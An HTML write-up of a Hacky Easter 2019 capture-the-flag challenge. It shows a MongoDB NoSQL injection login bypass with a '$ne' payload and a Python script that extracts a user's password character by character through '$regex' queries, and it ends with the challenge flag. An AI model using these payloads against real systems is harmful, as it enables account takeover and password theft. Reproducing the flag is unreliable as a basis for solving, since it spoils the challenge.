@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" href="../he19.css">
+    <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+    <title>Writeup: Hacky Easter 2019</title>
+  </head>
+  <body>
+      <h2 class="yellow">Egg 10: Stackunderflow</h2>
+      <p class="problem_yellow">
+        Check out this new Q&A site. They must be hiding something 
+        but we don't know where to search.
+      </p>
+      <img src="img/home.png" width="800">
+      <p>The site has two accessible sub-pages: a catalogue of questions and answers</p>
+      <img src="img/questions.png" width="800">
+      <p>and a login page</p>
+      <img src="img/login.png" width="800">
+      <p>
+        Secret information might be in a number of places. 
+        There might be unlisted, but accessible pages under questions, 
+        or one could try SQL injection in the login form. No luck! 
+      </p>
+      <p>
+        a first hint appears when looking for 
+        <b>http://whale.hacking-lab.com:3371/robots.txt</b>: <br>
+        <code>Maybe the_admin knows more about the flag</code><br>
+        Following this lead, there is one question asked by the_admin:
+      </p>
+      <img src="img/question_nosql.png" width="800">
+      <p>
+        Oh dear, they are using NoSQL? No wonder normal SQL injection did not work!
+        Some <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">background reading</a>
+        shows that there are no universal attack vectors, because different types of NoSQL 
+        databases use different syntax. Luckily, the search is narrowed a bit 
+        by the answer to the_admin's question above.
+      </p>
+      <p>
+        Because the injection material is usually structured, POST requests with JSON
+        payload should be used, with<br>
+        <code>Content-Type: application/json</code>.<br>
+        After quite some searching, it turned out that the DB seems to be MongoDB. 
+        The JSON payload
+        <pre class="prettyprint lang-sh">
+{
+  "username": "the_admin",
+  "password": {"$ne": null}
+}</pre>
+        worked and logged me in as the_admin. Hooray! I'm in! Riches beyond compare! 
+        Now what?
+      </p>
+      <img src="img/the_admin.png" width="800">
+      <p>
+        The only visible difference is that a new question has appeared:
+      </p>
+      <img src="img/question_null.png" width="800">
+      <p>
+        So, apparently the flag is the password of another user, null. 
+        And even an admin has no access to the passwords. Bummer. 
+      </p>
+      <p>
+        To reconstruct the password of null, I used regex queries, testing 
+        for each letter in turn. For example,
+        <pre class="prettyprint lang-sh">
+{
+  "username": "null",
+  "password": {"$regex": "^a.*"}
+}</pre>
+        tests whether the password starts withe the letter a. 
+        A python script automates the process:
+      </p>
+      <pre class="prettyprint lang-py">
+from requests import Session
+import string
+
+url = "http://whale.hacking-lab.com:3371/"
+sess = Session()
+headers = {
+    "Referer": "http://whale.hacking-lab.com:3371/login",
+    "Host": "whale.hacking-lab.com:3371",
+    "Content-type": "application/json"
+}
+sess.headers.update(headers)
+
+payload = {
+    "username": "null",
+    "password": {"$regex": None}
+}
+
+# Find alphabet of password
+alphabet = []
+for c in string.ascii_letters + string.digits + "_-":
+    payload["password"]["$regex"] = c
+    req = sess.post(url + 'login', json=payload)
+    if req.status_code == 200:
+        alphabet.append(c)
+        print(c)
+print(alphabet)
+
+# alphabet = ['3', '6', '7', 'c', 'e', 'f', 'x', 'E', 'F', 'G', 'K', 'M', 'P', 'Q']
+password = ""
+found = True
+while found:
+    found = False
+    for c in alphabet:
+        payload["password"]["$regex"] = '^' + password + c
+        req = sess.post(url + 'login', json=payload)
+        if req.status_code == 200:
+            print(password, c)
+            password += c
+            found = True
+            break
+print("Password = ", password)</pre>
+      <p>
+        To reduce the number of queries, the scrip first tests which letters appear 
+        in the password. Once the alphabet has been established, the password is 
+        successively built up by checking for responses with status code 200.
+        The password and flag is<br>
+        <b>N0SQL_injections_are_a_thing</b> 
+      </p>
+  </body>
+</html>
